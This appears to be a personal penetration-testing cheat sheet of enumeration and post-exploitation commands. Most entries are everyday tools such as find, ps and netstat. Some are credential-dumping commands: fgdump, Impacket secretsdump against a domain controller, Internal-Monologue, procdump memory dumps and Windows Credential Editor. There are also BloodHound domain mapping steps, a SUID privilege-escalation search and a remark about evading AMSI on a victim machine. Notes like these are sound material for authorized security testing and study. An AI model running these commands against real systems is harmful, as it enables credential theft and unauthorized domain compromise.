# [aureport](https://linux.die.net/man/8/aureport):
#### `aureport --tty | grep su`
#### `aureport --tty | grep sudo`
  * -tty reports on tty keystrokes - think hands on shell
  * -l reports on logins
  * -n reports on anomaly events
  * -r reports on responses to anomalies

# [BloodHound](https://github.com/BloodHoundAD/BloodHound):
#### `sudo neo4j console`
#### `BloodHound`
#### `bloodhound-python -u username -p password -ns X.X.X.X -c all`
  * Start up neo4j
  * Run BloodHound (I moved mine to /usr/local/bin/BloodHound then added that to my path)
  * Run the bloodhound-python command from the Kali machine with the ns option being a DC (assuming you installed with `pip3 install bloodhound`)
    * Bonus with this method is you can proxychain it too
  * Alternatively you can maybe run on the victim machine if you can get around AMSI
  * Move the JSON files to the BloodHound UI

# [fgdump](https://web.archive.org/web/20191115054845/https://www.aldeid.com/wiki/FGDump):
#### `fgdump.exe`
#### `fgdump.exe -h X.X.X.X -l <file>`
  * -h specifies the host
  * -l logs the output to a file

# [find](https://linux.die.net/man/1/find): 
#### `find / -name ssh`
#### `find /bin -name ssh`
#### `find /bin -name ssh -exec file {} \`
#### `find / -perm -u=s -type f 2>/dev/null`
  * searches the given path (recursively) for what you entered
  * the last example finds SUID files, which can sometimes be used for privilege escalation

# [Impacket](https://github.com/SecureAuthCorp/impacket):
#### `python3 GetADUsers.py --dc-ip X.X.X.X <FQDN>/<username>:<password>`
#### `python3 GetUserSPNs.py --dc-ip X.X.X.X <FQDN>/<username>:<password>`
#### `python3 secretsdump.py --dc-ip X.X.X.X <FQDN>/<username>:<password>@Y.Y.Y.Y`
#### `python3 secretsdump.py -hashes <ntlm_hash> --dc-ip X.X.X.X --just-dc <FQDN>/DC1\$@Y.Y.Y.Y`
  * The scripts listed above are in the `/impacket/examples` directory
  * The secretsdump script can have Y.Y.Y.Y = X.X.X.X but doesn't have to
  * In the last example it uses the DC's computer account NTLM hash instead of a user/pass

# [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue):
#### `Internal-Monolgue.exe`
#### `msbuild InternalMonologue.sln -p:TargetFrameworkVersion=v4.5`
  * Saved as a submodule in [enumeration](https://github.com/kmanc/offensive_security/tree/master/scripts/enumeration), this can capture hashes from Windows machines
  * Run from an [evil-winrm shell](https://github.com/kmanc/offensive_security/blob/master/notes/access.md#evil-winrm) for results
  * Make sure to build with a .Net Framework that is on the target machine, as shown in the example 

# [klist](https://linux.die.net/man/1/klist):
#### `klist`
  * Shows caches Kerberos tickets for the current user

# [locate](https://linux.die.net/man/1/locate):
#### `locate ssh`
  * run `updatedb` to make sure locate is working with the most current data

# [net.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11)):
#### `net user`
#### `net user /domain`
#### `net user username /domain`
#### `net group /domain`
#### `net accounts`

# [netstat](https://linux.die.net/man/8/netstat):
#### `netstat antp`
#### `netstat nao`
  * -a shows all (including established TCP connections)
  * -n shows numbers instead of trying to resolve them
  * -t shows TCP
  * -u shows UDP
  * -p shows the PID to which the socket belongs

# [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump):
#### `procdump.exe -ma <executable>`
#### `procdump.exe -ma YYY` <-- YYY being a PID
  * -ma makes a dump file with all process memory (instead of the default thread and handle information)

# [ps](https://man7.org/linux/man-pages/man1/ps.1.html):
#### `ps aux`
  * a shows more than just the current user's active processes
  * u shows the user whose permissions are applied to the process 
  * x shows processes without a tty

# [tcpdump](https://linux.die.net/man/8/tcpdump):
#### `tcpdump -n -r <pcap_file>`
#### `tcpdump -n src host X.X.X.X -r <pcap_file>`
  * -n prevents DNS lookups of ip addresses
  * -r selects an input file
  * -c chooses a number of packets after which tcpdump stops reading
  * -I puts an interface in monitor mode
  * -w defines the output file

# [which](https://linux.die.net/man/1/which):
#### `which python3` 
#### `which ssh`
  * searches the path for the executable that corresponds to what you entered

# [Windows Credential Editor](https://web.archive.org/web/20191115055522/https://www.aldeid.com/wiki/Windows-credentials-editor):
#### `cwe.exe`
#### `cwe.exe -r`
  * -o logs output to a file
  * -r checks every 5 seconds until command is terminated
